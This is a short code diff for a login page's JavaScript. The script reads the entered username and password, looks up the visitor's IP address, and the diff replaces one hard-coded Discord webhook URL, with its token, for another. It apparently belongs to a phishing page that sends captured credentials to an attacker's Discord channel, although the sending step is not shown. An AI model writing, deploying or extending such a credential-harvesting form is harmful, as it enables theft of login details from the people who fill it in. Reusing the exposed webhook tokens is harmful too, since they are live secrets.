@@ -4,7 +4,7 @@ document.getElementById('loginForm').addEventListener('submit', async function (
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    const webhookURL = 'https://discord.com/api/webhooks/1281688345583554601/Kwsa8jn6iEN6hyVKK5psjZ-rzfdgfTw-nEwEDTmMDSjF-LAXIh65-kJ6Ez8H33frLXJL';
+    const webhookURL = 'https://discord.com/api/webhooks/1347248590803832865/4_v2YnypPuMvr-3pHjFohOkRvtDbIoUCAFw0y1SSqVXlTG1xDf40SFHXAHASFL2gkVlu';
 
     try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
